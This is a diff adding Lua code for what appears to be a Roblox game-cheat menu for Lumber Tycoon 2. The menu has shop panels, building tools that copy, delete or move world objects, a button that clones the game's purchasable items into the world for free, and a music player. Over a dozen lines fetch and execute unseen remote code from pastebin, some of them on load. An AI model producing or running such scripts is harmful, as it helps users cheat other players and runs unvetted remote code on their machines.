+	local Part16 = Instance.new("Part", Model)
+	Part16.Name = "Fence"
+	Part16.Reflectance = 0
+	Part16.Transparency = 0.5
+	Part16.Anchored = true
+	Part16.Archivable = true
+	Part16.CanCollide = false
+	Part16.Locked = false
+	Part16.BrickColor = BrickColor.new("Beige")
+	Part16.Material = Enum.Material.Fabric
+	Part16.Position = Vector3.new(-639.38134765625, 319.06237792969, 636.27484130859)
+	Part16.Size = Vector3.new(2037.669921875, 16.129999160767, 2)
+	Part16.Rotation = Vector3.new(0.0099999997764826, 30, -17.510000228882)
+	        wait(4.6)
+    for index, lumber in pairs(game.Workspace.Lumber:GetChildren()) do
+   lumber.CanCollide = true
+end
+end)
+
+
+TimesFrame.Name = "TimesFrame"
+TimesFrame.Parent = MainFrame
+TimesFrame.Active = true
+TimesFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+TimesFrame.BackgroundTransparency = 0.5
+TimesFrame.Position = UDim2.new(0, 185, 0, 30)
+TimesFrame.Selectable = true
+TimesFrame.Size = UDim2.new(0, 200, 0, 145)
+TimesFrame.Visible = true
+
+TimesTitle.Name = "TimesTitle"
+TimesTitle.Parent = TimesFrame
+TimesTitle.BackgroundColor3 = Color3.new(1, 0, 0)
+TimesTitle.BackgroundTransparency = 0.10000000149012
+TimesTitle.Position = UDim2.new(0, 5, 0, 5)
+TimesTitle.Size = UDim2.new(0, 190, 0, 20)
+TimesTitle.Font = Enum.Font.Fantasy
+TimesTitle.Text = "Shop Opening Times"
+TimesTitle.TextColor3 = Color3.new(1, 1, 1)
+TimesTitle.TextSize = 14
+
+TimeNowTitle.Name = "TimeNowTitle"
+TimeNowTitle.Parent = TimesFrame
+TimeNowTitle.BackgroundColor3 = Color3.new(1, 0, 0)
+TimeNowTitle.BackgroundTransparency = 1
+TimeNowTitle.Position = UDim2.new(0, 5, 0, 25)
+TimeNowTitle.Size = UDim2.new(0, 190, 0, 20)
+TimeNowTitle.Font = Enum.Font.Fantasy
+TimeNowTitle.Text = "-- Current Time: 00:00:00 --"
+TimeNowTitle.TextColor3 = Color3.new(1, 1, 1)
+TimeNowTitle.TextSize = 14
+
+CarsTitle.Name = "CarsTitle"
+CarsTitle.Parent = TimesFrame
+CarsTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+CarsTitle.BorderColor3 = Color3.new(1, 0, 0)
+CarsTitle.BackgroundTransparency = 0.69999998807907
+CarsTitle.Position = UDim2.new(0, 5, 0, 50)
+CarsTitle.Size = UDim2.new(0, 92, 0, 20)
+CarsTitle.Font = Enum.Font.Fantasy
+CarsTitle.Text = "Boxed Cars"
+CarsTitle.TextColor3 = Color3.new(1, 1, 1)
+CarsTitle.TextSize = 14
+
+FurnishTitle.Name = "FurnishTitle"
+FurnishTitle.Parent = TimesFrame
+FurnishTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+FurnishTitle.BorderColor3 = Color3.new(1, 0, 0)
+FurnishTitle.BackgroundTransparency = 0.69999998807907
+FurnishTitle.Position = UDim2.new(0, 5, 0, 75)
+FurnishTitle.Size = UDim2.new(0, 92, 0, 20)
+FurnishTitle.Font = Enum.Font.Fantasy
+FurnishTitle.Text = "Furnishings"
+FurnishTitle.TextColor3 = Color3.new(1, 1, 1)
+FurnishTitle.TextSize = 14
+
+LinkTitle.Name = "LinkTitle"
+LinkTitle.Parent = TimesFrame
+LinkTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+LinkTitle.BorderColor3 = Color3.new(1, 0, 0)
+LinkTitle.BackgroundTransparency = 0.69999998807907
+LinkTitle.Position = UDim2.new(0, 5, 0, 100)
+LinkTitle.Size = UDim2.new(0, 92, 0, 20)
+LinkTitle.Font = Enum.Font.Fantasy
+LinkTitle.Text = "Link's Logic"
+LinkTitle.TextColor3 = Color3.new(1, 1, 1)
+LinkTitle.TextSize = 14
+
+OtherShopsNote.Name = "OtherShopsNote"
+OtherShopsNote.Parent = TimesFrame
+OtherShopsNote.BackgroundColor3 = Color3.new(1, 0, 0)
+OtherShopsNote.BackgroundTransparency = 1
+OtherShopsNote.Position = UDim2.new(0, 5, 0, 120)
+OtherShopsNote.Size = UDim2.new(0, 190, 0, 20)
+OtherShopsNote.Font = Enum.Font.Fantasy
+OtherShopsNote.Text = "All Other Shops Are Open 24/7"
+OtherShopsNote.TextColor3 = Color3.new(1, 1, 1)
+OtherShopsNote.TextSize = 14
+
+FOpenTitle.Name = "FOpenTitle"
+FOpenTitle.Parent = TimesFrame
+FOpenTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+FOpenTitle.BorderColor3 = Color3.new(1, 0, 0)
+FOpenTitle.BackgroundTransparency = 0.69999998807907
+FOpenTitle.Position = UDim2.new(0, 102, 0, 75)
+FOpenTitle.Size = UDim2.new(0, 92, 0, 20)
+FOpenTitle.Font = Enum.Font.Fantasy
+FOpenTitle.Text = " -- Status --"
+FOpenTitle.TextColor3 = Color3.new(1, 1, 1)
+FOpenTitle.TextSize = 14
+
+COpenTitle.Name = "COpenTitle"
+COpenTitle.Parent = TimesFrame
+COpenTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+COpenTitle.BorderColor3 = Color3.new(1, 0, 0)
+COpenTitle.BackgroundTransparency = 0.69999998807907
+COpenTitle.Position = UDim2.new(0, 102, 0, 50)
+COpenTitle.Size = UDim2.new(0, 92, 0, 20)
+COpenTitle.Font = Enum.Font.Fantasy
+COpenTitle.Text = " -- Status --"
+COpenTitle.TextColor3 = Color3.new(1, 1, 1)
+COpenTitle.TextSize = 14
+
+LOpenTitle.Name = "LOpenTitle"
+LOpenTitle.Parent = TimesFrame
+LOpenTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+LOpenTitle.BorderColor3 = Color3.new(1, 0, 0)
+LOpenTitle.BackgroundTransparency = 0.69999998807907
+LOpenTitle.Position = UDim2.new(0, 102, 0, 100)
+LOpenTitle.Size = UDim2.new(0, 92, 0, 20)
+LOpenTitle.Font = Enum.Font.Fantasy
+LOpenTitle.Text = "-- Status --"
+LOpenTitle.TextColor3 = Color3.new(1, 1, 1)
+LOpenTitle.TextSize = 14
+-- Time
+
+spawn(function()
+	while true do 
+		TimeNowTitle.Text = "-- Current Time: " .. game.Lighting.TimeOfDay .. " --"
+		wait(1)
+	end
+end)
+
+spawn(function()
+	while true do
+		if game.Lighting.TimeOfDay > "07:00:00" and game.Lighting.TimeOfDay < "21:00:00" then
+			FOpenTitle.Text = "Open"
+			FOpenTitle.TextColor3 = Color3.new(0, 255, 0)
+			LOpenTitle.Text = "Open"
+			LOpenTitle.TextColor3 = Color3.new(0, 255, 0)
+		else
+			FOpenTitle.Text = "Closed"
+			FOpenTitle.TextColor3 = Color3.new(255, 0, 0)
+			LOpenTitle.Text = "Closed"
+			LOpenTitle.TextColor3 = Color3.new(255, 0, 0)
+		end
+        wait(1)
+	end
+end)
+
+spawn(function()
+	while true do
+		if game.Lighting.TimeOfDay > "09:50:00" and game.Lighting.TimeOfDay < "19:30:00" then
+			COpenTitle.Text = "Open"
+			COpenTitle.TextColor3 = Color3.new(0, 255, 0)
+		else
+			COpenTitle.Text = "Closed"
+			COpenTitle.TextColor3 = Color3.new(255, 0, 0)
+		end
+        wait(1)
+	end
+end)
+
+
+Buymenu.Name = "Buymenu"
+Buymenu.Parent = Picker
+Buymenu.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
+Buymenu.BorderColor3 = Color3.new(0, 0, 0)
+Buymenu.Position = UDim2.new(0, 15, 0,515)
+Buymenu.Size = UDim2.new(0, 80, 0, 80)
+Buymenu.ZIndex = 3
+Buymenu.Image = "rbxassetid://4892949805"
+Buymenu.ScaleType = Enum.ScaleType.Crop
+Buymenu.MouseButton1Click:Connect(function()
+CurrentItem.Image = "rbxassetid://4892949805"
+  makesound("rbxassetid://156785206")
+AIntroImage.Visible = true
+AIntroImage1.Visible = true
+AIntroImage2.Visible = false
+AIntroImage3.Visible = false
+TimesFrame.Visible = false
+end)
+
+BuyFrame.Name = "BuyFrame"
+BuyFrame.Parent = MenuFrame
+BuyFrame.BorderSizePixel = 1
+BuyFrame.BackgroundTransparency = 0.5
+BuyFrame.BorderColor3 = Color3.new(0, 0, 0)
+BuyFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+BuyFrame.Size = UDim2.new(0, 170, 0, 118)
+BuyFrame.Visible = false
+
+wrus.Name = "wrus"
+wrus.Parent = BuyFrame
+wrus.BackgroundColor3 = Color3.new(0, 0, 0)
+wrus.BorderColor3 = Color3.new(1, 0, 0)
+wrus.BackgroundTransparency = 0.6
+wrus.Position =  UDim2.new(0, 3, 0, 3)
+wrus.Size = UDim2.new(0, 164, 0, 20)
+wrus.Font = Enum.Font.Fantasy
+wrus.Text = "Wood R Us"
+wrus.TextColor3 = Color3.new(1, 1, 1)
+wrus.TextSize = 14
+wrus.MouseButton1Click:connect(function()
+BuyFrame.Visible = true
+TimesFrame.Visible = false
+end)
+
+loadstring(game:HttpGet(('https://pastebin.com/raw/0xegF4ak'),true))()
+
+fshop.Name = "fshop"
+fshop.Parent = BuyFrame
+fshop.BackgroundColor3 = Color3.new(0, 0, 0)
+fshop.BorderColor3 = Color3.new(1, 0, 0)
+fshop.BackgroundTransparency = 0.6
+fshop.Position =  UDim2.new(0, 3, 0, 26)
+fshop.Size = UDim2.new(0, 164, 0, 20)
+fshop.Font = Enum.Font.Fantasy
+fshop.Text = "Furniture Store"
+fshop.TextColor3 = Color3.new(1, 1, 1)
+fshop.TextSize = 14
+fshop.MouseButton1Click:connect(function()
+BuyFrame.Visible = true
+TimesFrame.Visible = false
+  makesound("rbxassetid://156785206")
+end)
+loadstring(game:HttpGet('https://pastebin.com/raw/GMbjQs9u',true))()
+
+bcps.Name = "bcps"
+bcps.Parent = BuyFrame
+bcps.BackgroundColor3 = Color3.new(0, 0, 0)
+bcps.BorderColor3 = Color3.new(1, 0, 0)
+bcps.BackgroundTransparency = 0.6
+bcps.Position =  UDim2.new(0, 3, 0, 49)
+bcps.Size = UDim2.new(0, 164, 0, 20)
+bcps.Font = Enum.Font.Fantasy
+bcps.Text = "Bobs, Car, Pics"
+bcps.TextColor3 = Color3.new(1, 1, 1)
+bcps.TextSize = 14
+bcps.MouseButton1Click:connect(function()
+BuyFrame.Visible = true
+TimesFrame.Visible = false
+  makesound("rbxassetid://156785206")
+end)
+
+loadstring(game:HttpGet('https://pastebin.com/raw/BsdEBgn5',true))()
+
+ls.Name = "ls"
+ls.Parent = BuyFrame
+ls.BackgroundColor3 = Color3.new(0, 0, 0)
+ls.BorderColor3 = Color3.new(1, 0, 0)
+ls.Position =  UDim2.new(0, 3, 0, 72)
+ls.BackgroundTransparency = 0.6
+ls.Size = UDim2.new(0, 164, 0, 20)
+ls.Font = Enum.Font.Fantasy
+ls.Text = "Logic Store"
+ls.TextColor3 = Color3.new(1, 1, 1)
+ls.TextSize = 14
+ls.MouseButton1Click:connect(function()
+BuyFrame.Visible = true
+TimesFrame.Visible = false
+makesound("rbxassetid://156785206")
+end)
+
+loadstring(game:HttpGet('https://pastebin.com/raw/yUpzvZv0',true))()
+
+bp.Name = "bp"
+bp.Parent = BuyFrame
+bp.BackgroundColor3 = Color3.new(0, 0, 0)
+bp.BorderColor3 = Color3.new(1, 0, 0)
+bp.Position =  UDim2.new(0, 3, 0, 95)
+bp.BackgroundTransparency = 0.6
+bp.Size = UDim2.new(0, 164, 0, 20)
+bp.Font = Enum.Font.Fantasy
+bp.Text = "Blue Prints"
+bp.TextColor3 = Color3.new(1, 1, 1)
+bp.TextSize = 14
+bp.MouseButton1Click:connect(function()
+TimesFrame.Visible = false
+BuyFrame.Visible = true
+  makesound("rbxassetid://156785206")
+end)
+
+loadstring(game:HttpGet('https://pastebin.com/raw/z76GxUDU',true))()
+
+Btoolamenu.Name = "Btoolamenu"
+Btoolamenu.Parent = Picker
+Btoolamenu.BackgroundColor3 = Color3.new(0, 0, 0)
+Btoolamenu.BorderColor3 = Color3.new(0, 0, 0)
+Btoolamenu.Position = UDim2.new(0, 15, 0,600)
+Btoolamenu.Size = UDim2.new(0, 80, 0, 80)
+Btoolamenu.ZIndex = 3
+Btoolamenu.Image = "rbxassetid://4892950263"
+Btoolamenu.ScaleType = Enum.ScaleType.Crop
+CurrentItem.Image = "rbxassetid://4892950263"
+Btoolamenu.MouseButton1Click:Connect(function()
+  makesound("rbxassetid://156785206")
+end)
+
+LT2GUI2Frame.Name = "LT2GUI2Frame"
+LT2GUI2Frame.Parent = MenuFrame
+LT2GUI2Frame.BorderSizePixel = 1
+LT2GUI2Frame.BackgroundTransparency = 0.5
+LT2GUI2Frame.BorderColor3 = Color3.new(0, 0, 0)
+LT2GUI2Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+LT2GUI2Frame.Size = UDim2.new(0, 170, 0, 278)
+LT2GUI2Frame.Visible = false
+
+
+FunStuffHOVER.Name = "FunStuffHOVER"
+FunStuffHOVER.Parent = LT2GUI2Frame
+FunStuffHOVER.BackgroundColor3 = Color3.new(0, 0, 0)
+FunStuffHOVER.BackgroundTransparency = 0.6
+FunStuffHOVER.BorderColor3 = Color3.new(1, 0, 0)
+FunStuffHOVER.Position =  UDim2.new(0, 3, 0, 3)
+FunStuffHOVER.Size = UDim2.new(0, 165, 0, 20)
+FunStuffHOVER.Font = Enum.Font.Fantasy
+FunStuffHOVER.Text = "Hover Board"
+FunStuffHOVER.TextColor3 = Color3.new(1, 1, 1)
+FunStuffHOVER.TextSize = 14
+FunStuffHOVER.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+
+loadstring(game:HttpGet(('https://pastebin.com/raw/DabYym5D'),true))()
+
+end)
+
+FunStuffTHOMAS.Name = "FunStuffTHOMAS"
+FunStuffTHOMAS.Parent = LT2GUI2Frame
+FunStuffTHOMAS.BackgroundColor3 = Color3.new(0, 0, 0)
+FunStuffTHOMAS.BorderColor3 = Color3.new(1, 0, 0)
+FunStuffTHOMAS.BackgroundTransparency = 0.6
+FunStuffTHOMAS.Position =  UDim2.new(0, 3, 0, 26)
+FunStuffTHOMAS.Size = UDim2.new(0, 165, 0, 20)
+FunStuffTHOMAS.Font = Enum.Font.Fantasy
+FunStuffTHOMAS.Text = "Thomas The Tank"
+FunStuffTHOMAS.TextColor3 = Color3.new(1, 1, 1)
+FunStuffTHOMAS.TextSize = 14
+FunStuffTHOMAS.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+loadstring(game:HttpGet(('http://pastebin.com/raw/tMr759X7'),true))()
+
+end)
+
+FunStuffPOLICE.Name = "FunStuffPOLICE"
+FunStuffPOLICE.Parent = LT2GUI2Frame
+FunStuffPOLICE.BackgroundColor3 = Color3.new(0, 0, 0)
+FunStuffPOLICE.BorderColor3 = Color3.new(1, 0, 0)
+FunStuffPOLICE.Position =  UDim2.new(0, 3, 0, 49)
+FunStuffPOLICE.BackgroundTransparency = 0.6
+FunStuffPOLICE.Size = UDim2.new(0, 165, 0, 20)
+FunStuffPOLICE.Font = Enum.Font.Fantasy
+FunStuffPOLICE.Text = "Police Man"
+FunStuffPOLICE.TextColor3 = Color3.new(1, 1, 1)
+FunStuffPOLICE.TextSize = 14
+FunStuffPOLICE.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+loadstring(game:HttpGet(('https://pastebin.com/raw/FR9Fzcqw'),true))()
+
+end)
+
+FunStuffSPRAY.Name = "FunStuffSPRAY"
+FunStuffSPRAY.Parent = LT2GUI2Frame
+FunStuffSPRAY.BackgroundColor3 = Color3.new(0, 0, 0)
+FunStuffSPRAY.BorderColor3 = Color3.new(1, 0, 0)
+FunStuffSPRAY.Position =  UDim2.new(0, 3, 0, 72)
+FunStuffSPRAY.BackgroundTransparency = 0.6
+FunStuffSPRAY.Size = UDim2.new(0, 165, 0, 20)
+FunStuffSPRAY.Font = Enum.Font.Fantasy
+FunStuffSPRAY.Text = "Spray Can"
+FunStuffSPRAY.TextColor3 = Color3.new(1, 1, 1)
+FunStuffSPRAY.TextSize = 14
+FunStuffSPRAY.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+loadstring(game:HttpGet(('http://pastebin.com/raw/raYkCjyy'),true))()
+
+end)
+
+FunStuffCOCA.Name = "FunStuffCOCA"
+FunStuffCOCA.Parent = LT2GUI2Frame
+FunStuffCOCA.BackgroundColor3 = Color3.new(0, 0, 0)
+FunStuffCOCA.BorderColor3 = Color3.new(1, 0, 0)
+FunStuffCOCA.Position =  UDim2.new(0, 3, 0, 95)
+FunStuffCOCA.BackgroundTransparency = 0.6
+FunStuffCOCA.Size = UDim2.new(0, 165, 0, 20)
+FunStuffCOCA.Font = Enum.Font.Fantasy
+FunStuffCOCA.Text = "Coca Cola"
+FunStuffCOCA.TextColor3 = Color3.new(1, 1, 1)
+FunStuffCOCA.TextSize = 14
+FunStuffCOCA.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+loadstring(game:HttpGet(('https://pastebin.com/raw/nMu90Kdq'),true))()
+
+end)
+
+FunStuffLEAKED.Name = "FunStuffLEAKED"
+FunStuffLEAKED.Parent = LT2GUI2Frame
+FunStuffLEAKED.BackgroundColor3 = Color3.new(0, 0, 0)
+FunStuffLEAKED.BorderColor3 = Color3.new(1, 0, 0)
+FunStuffLEAKED.Position =  UDim2.new(0, 3, 0, 118)
+FunStuffLEAKED.BackgroundTransparency = 0.6
+FunStuffLEAKED.Size = UDim2.new(0, 165, 0, 20)
+FunStuffLEAKED.Font = Enum.Font.Fantasy
+FunStuffLEAKED.Text = "Leaked Items"
+FunStuffLEAKED.TextColor3 = Color3.new(1, 1, 1)
+FunStuffLEAKED.TextSize = 14
+FunStuffLEAKED.MouseButton1Down:connect(function() 
+  makesound("rbxassetid://156785206")
+
+game.ReplicatedStorage.Purchasables:Clone().Parent = game.Workspace.PlayerModels
+end)
+
+
+FunStuffFLASH.Name = "FunStuffFLASH"
+FunStuffFLASH.Parent = LT2GUI2Frame
+FunStuffFLASH.BackgroundColor3 = Color3.new(0, 0, 0)
+FunStuffFLASH.BorderColor3 = Color3.new(1, 0, 0)
+FunStuffFLASH.Position =  UDim2.new(0, 3, 0, 141)
+FunStuffFLASH.BackgroundTransparency = 0.6
+FunStuffFLASH.Size = UDim2.new(0, 165, 0, 20)
+FunStuffFLASH.Font = Enum.Font.Fantasy
+FunStuffFLASH.Text = "Flash Light"
+FunStuffFLASH.TextColor3 = Color3.new(1, 1, 1)
+FunStuffFLASH.TextSize = 14
+FunStuffFLASH.MouseButton1Click:Connect(function()
+  makesound("rbxassetid://156785206")
+   FunStuffFLASH.BackgroundColor3 = Color3.new(0.14902, 0.490196, 0.109804)
+-- Created by supersonicfan111
+local p=game:GetService"Players".LocalPlayer
+local c=p.Character
+local surf='SmoothNoOutlines'
+if not c then error'Cannot find character, please respawn, then rerun the script' end
+
+-- Flashlight Handle
+local hand=Instance.new"Part"
+hand.BrickColor=BrickColor.DarkGray()
+hand.Parent=c
+hand.Anchored=false
+hand.Locked=true
+hand.CanCollide=false
+hand.FormFactor='Custom'
+hand.Size=Vector3.new(1,1,2)
+hand.TopSurface,hand.BottomSurface=surf,surf
+
+-- Torch Effect
+local fe=Instance.new"Part"
+fe.BrickColor=BrickColor.new"Black"
+fe.Parent=c
+fe.Anchored=false
+fe.Locked=true
+fe.CanCollide=false
+fe.FormFactor='Custom'
+fe.Size=Vector3.new(.8,.8,.2)
+fe.TopSurface,hand.BottomSurface=surf,surf
+
+-- Welding stuff
+
+-- Flash to Right Arm
+local weld1=Instance.new"Weld"
+weld1.Parent=hand
+weld1.Part0=hand
+weld1.Part1=c['Right Arm']
+weld1.C0=CFrame.new(0, 1.5, 0)
+
+-- Torch Effect to Flash
+local weld2=Instance.new"Weld"
+weld2.Parent=hand
+weld2.Part0=hand
+weld2.Part1=fe
+weld2.C0=CFrame.new(0, 0, 1)
+
+-- Right Arm Weld
+local ra=Instance.new"Weld"
+ra.Parent=c['Torso']
+ra.Part0=c['Right Arm']
+ra.Part1=c['Torso']
+ra.C0=CFrame.new(-1.5,1,0)*CFrame.Angles(math.rad(180),0,0)
+
+
+
+-- Flashlight Functionality
+
+local flashlightOn = false
+local Battery=50
+
+-- Handles turning the flashlight on/off
+p:GetMouse().Button1Down:connect(function()
+	flashlightOn=not flashlightOn
+	if flashlightOn then
+		fe.BrickColor=BrickColor.new"New Yeller"
+		light=Instance.new"SurfaceLight"
+		light.Parent=fe
+		light.Range=1000
+		light.Face="Back"
+		light.Brightness=10
+		fe.Material="Neon"
+	else
+		fe.BrickColor=BrickColor.new"Black"
+		if light then light:destroy() end
+		fe.Material="SmoothPlastic"
+	end
+end)
+
+ -- Battery Modules
+ 
+-- Depleting and Charging
+spawn(function()
+	while wait(1) do
+		if flashlightOn then
+			if Battery > 0 then
+				Battery=Battery-1
+			end
+		else
+			if Battery < 100 then
+				Battery=Battery+1
+			end
+		end
+		print(Battery)
+	end
+end)
+
+-- Turning off flashlight if the battery is too low
+spawn(function()
+	while wait() do
+		if Battery <= 0 then
+			flashlightOn=false
+			if light then light:destroy() end
+			fe.BrickColor=BrickColor.new"Black"
+			fe.Material="SmoothPlastic"
+		end
+	end
+end)
+
+local stepped = game:GetService'RunService'.RenderStepped
+end)
+
+
+OPFinality1.Name = "OPFinality1"
+OPFinality1.Parent = LT2GUI2Frame
+OPFinality1.BackgroundColor3 = Color3.new(0, 0, 0)
+OPFinality1.BorderColor3 = Color3.new(1, 0, 0)
+OPFinality1.Position =  UDim2.new(0, 3, 0, 164)
+OPFinality1.BackgroundTransparency = 0.6
+OPFinality1.Size = UDim2.new(0, 165, 0, 20)
+OPFinality1.Font = Enum.Font.Fantasy
+OPFinality1.Text = "OP Finality"
+OPFinality1.TextColor3 = Color3.new(1, 1, 1)
+OPFinality1.TextSize = 14
+OPFinality1.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+loadstring(game:HttpGet(('https://pastebin.com/raw/hkQ5HfV5'),true))()
+
+end)
+
+
+Mouse.Button1Up:connect(function()
+MDown = false
+end)
+ 
+Mouse.Button1Down:connect(function()
+MDown = true
+if BTool == "Copy" then
+if Mouse.Target ~= nil then
+Clone = Mouse.Target:clone()
+Clone.Parent = game.Workspace
+end
+end
+ 
+if BTool == "Delete" then
+if Mouse.Target ~= nil then
+Mouse.Target:remove()
+end
+end
+ 
+if BTool == "Move" then
+if Mouse.Target ~= nil then
+MoveObject = Mouse.Target
+end
+end
+ 
+wait()
+if Clone ~= nil then
+Clone.CanCollide = false
+repeat
+wait()
+SubX = Clone.Size.X/2
+SubY = Clone.Size.Y/2
+SubZ = Clone.Size.Z/2
+Clone.Position = Vector3.new(Mouse.Hit.X - SubX, Mouse.Hit.Y - SubY, Mouse.Hit.Z - SubZ)
+until MDown == false
+Clone.CanCollide = true
+Clone.Position = Clone.Position + Vector3.new(SubX, SubY, SubZ)
+Clone = nil
+end
+ 
+if MoveObject ~= nil then
+MoveObject.CanCollide = false
+repeat
+wait()
+SubX = MoveObject.Size.X/2
+SubY = MoveObject.Size.Y/2
+SubZ = MoveObject.Size.Z/2
+MoveObject.Position = Vector3.new(Mouse.Hit.X - SubX, Mouse.Hit.Y - SubY, Mouse.Hit.Z - SubZ)
+until MDown == false
+MoveObject.CanCollide = true
+MoveObject.Position =  MoveObject.Position + Vector3.new(SubX, SubY, SubZ)
+MoveObject= nil
+end
+end)
+
+Radio.Name = "Radio"
+Radio.Parent = Picker
+Radio.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
+Radio.BorderColor3 = Color3.new(0, 0, 0)
+Radio.Position = UDim2.new(0, 15, 0, 685)
+Radio.Size = UDim2.new(0, 80, 0, 80)
+Radio.ZIndex = 3
+Radio.Image = "rbxassetid://4892951279"
+Radio.ScaleType = Enum.ScaleType.Crop
+Radio.MouseButton1Click:Connect(function()
+CurrentItem.Image = "rbxassetid://4892951279"
+  makesound("rbxassetid://156785206")
+AIntroImage.Visible = false
+AIntroImage1.Visible = false
+TimesFrame.Visible = false
+end)
+
+RadioFrame.Name = "RadioFrame"
+RadioFrame.Parent = MenuFrame
+RadioFrame.BorderSizePixel = 1
+RadioFrame.BackgroundTransparency = 1
+RadioFrame.BorderColor3 = Color3.new(0, 0, 0)
+RadioFrame.BackgroundColor3 = Color3.fromRGB(151, 0, 0)
+RadioFrame.Size = UDim2.new(0, 170, 0, 255)
+RadioFrame.Visible = false
+
+RadioLabel.Name = "RadioLabel"
+RadioLabel.Parent = RadioFrame
+RadioLabel.BackgroundTransparency = 1
+RadioLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+RadioLabel.BorderColor3 = Color3.new(0, 0, 0)
+RadioLabel.BorderSizePixel = 2
+RadioLabel.Size = UDim2.new(0, 200, 0, 200)
+RadioLabel.Position = UDim2.new(0, 0, 0, 0)
+RadioLabel.Image = "rbxassetid://4306993084"
+
+InfoText36.Name = "InfoText2"
+InfoText36.Parent = MainFrame
+InfoText36.BackgroundColor3 = Color3.fromRGB(151, 0, 0)
+InfoText36.BorderColor3 = Color3.new(0, 0, 0)
+InfoText36.BackgroundTransparency = 0.2
+InfoText36.Position = UDim2.new(0, 230, 0, 170)
+InfoText36.Size = UDim2.new(0, 80, 0, 20)
+InfoText36.TextColor3 = Color3.new(0, 0, 0)
+InfoText36.Font = Enum.Font.Fantasy
+InfoText36.Text =  "Stop Track."
+InfoText36.TextSize = 17
+InfoText36.TextWrapped = true
+InfoText36.Visible = false
+InfoText36.ZIndex = 7
+InfoText36.TextYAlignment = Enum.TextYAlignment.Top
+
+Stop.MouseEnter:connect(function()
+InfoText36.Visible = true
+end)
+
+Stop.MouseLeave:connect(function()
+InfoText36.Visible = false
+end)
+
+Stop.Name = "Stop"
+Stop.Parent = RadioFrame
+Stop.BackgroundColor3 = Color3.new(0, 0, 0)
+Stop.BackgroundTransparency = 1
+Stop.Position = UDim2.new(0, 145, 0, 138)
+Stop.Size = UDim2.new(0, 30, 0, 30)
+Stop.Font = Enum.Font.SourceSans
+Stop.FontSize = Enum.FontSize.Size18
+Stop.Text = ""
+Stop.TextSize = 15
+Stop.TextScaled = true
+Stop.TextWrapped = true
+Stop.TextColor3 = Color3.fromRGB(249, 233, 153)
+
+
+
+Vol.Name = "Vol"
+Vol.Parent = RadioFrame
+Vol.BackgroundColor3 = Color3.new(0, 0, 0)
+Vol.BackgroundTransparency = 1
+Vol.Position = UDim2.new(0, 87, 0, 111)
+Vol.Size = UDim2.new(0, 30, 0, 12)
+Vol.Font = Enum.Font.SourceSans
+Vol.FontSize = Enum.FontSize.Size18
+Vol.Text = "Volume"
+Vol.TextSize = 12
+Vol.TextScaled = true
+Vol.TextWrapped = true
+Vol.TextColor3 = Color3.fromRGB(249, 233, 153)
+
+scrgui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
+sound = Instance.new("Sound",scrgui)
+
+
+fr2tb1 = Instance.new("TextBox")
+fr2tl2 = Instance.new("TextLabel")
+vslz = Instance.new("Frame")
+
+--
+
+fr3tl2tb1 = Instance.new("TextButton")
+fr3tl3 = Instance.new("TextLabel")
+fr3tl3tb1 = Instance.new("TextBox",fr3tl3)
+
+--
+scrf = Instance.new("ScrollingFrame")
+looped = false
+
+function clr(num1, num2, num3) --color3 converter function
+	local color1 = num1/255
+	local color2 = num2/255
+	local color3 = num3/255
+	return Color3.new(color1, color2, color3)
+end
+
+textcolor = clr(255,255,255)
+textcolor2 = clr(0,0,0)
+
+--music
+
+local music = { --25
+	"829801270",
+	"467369212",
+	"1978951123",
+	"2916513007",
+	"4273337023",
+	"4211262527",
+	"4255029113",
+	"4291241756",
+	"2911086781",
+	"3407002205",
+	"4282589796",
+	"2930724233",
+	"3809358736",
+	"4250558781",
+	"4057096436",
+	"4094517246",
+	"4291241756",
+	"1464709380",
+	"1134058594",
+	"2795309551",
+	"2808069027",
+	"1175748632 ",
+	"2560631742",
+	"441150761",
+	"897054199",
+	"512482601",
+	"2916513007",
+	"2916450382",
+	"2911133909",
+	"2920534090",
+	"2653366831",
+	"2653049912",
+	"2043307868",
+	"1327222154",
+	"2068058787",
+	"2550256434",
+	"844360638",
+	"332379850",
+	"1472103710",
+	"613257931",
+	"2454470726",
+	"2036067038",
+	"603146550",
+	"2065266416",
+	"2742427088",
+	"1172077868",
+	"859861483",
+	"2255118726",
+	"1005445264",
+	"985571061",
+	"2798381986",
+	"1138904665",
+	"1316845233",
+	"2240509500",
+	"2698389751",
+	"1300488711",
+	"971487030",
+	"978616673",
+	"3188425141",
+	"2139972744",
+	"1247011377",
+	"1014862046",
+	"981890082",
+	"2107586824",
+	"561661266",
+	"2312896111",
+	"716547078",
+	"544422657",
+	"2677300218",
+	"1362952031",
+	"790300829",
+	"981170452",
+	"3663034837",
+	"3401994659",
+	"978628901",
+	"657813878",
+	"2121086591",
+	"3060904907",
+	"2689788050"
+
+}
+
+local musicnames = {
+	"Clean Bandit - Symphony",
+	"The Chainsmokers - Closer",
+	"AC/DC - If You Want Blood",
+	"Post Malon - Better Now",
+	"Selena Gomez - lose you to",
+	"Selena Gomez - Look At Her Now",
+	"Travi$ Scott - Hot (Remix)",
+	"Kanye West - Follow God",
+	"Coldplay - Paradise",
+	"Coldplay - Adventure Of A Lifetime (Instro)",
+	"Dua Lipa - Don't Start Now",
+	"Post Malon - Wow",
+	"lizzo - good as hell",
+	"Maroon 5 - Memories (cover)",
+	"Lewis Capaldi - Bruises",
+	"Lewis Capaldi - One",
+	"Kanye West - Follow God",
+	"Camila Cabello - Havana",
+	"Ed Sheeran - Stay with me",
+	"The Script - Hall of Fame (8D Audio)",
+	"Pink Floyd - Another Brick In The Wall",
+	"We'll rock you (Queen) + Back in black (ACDC)",
+	"Queen-These Are The Days Of Our Lives",
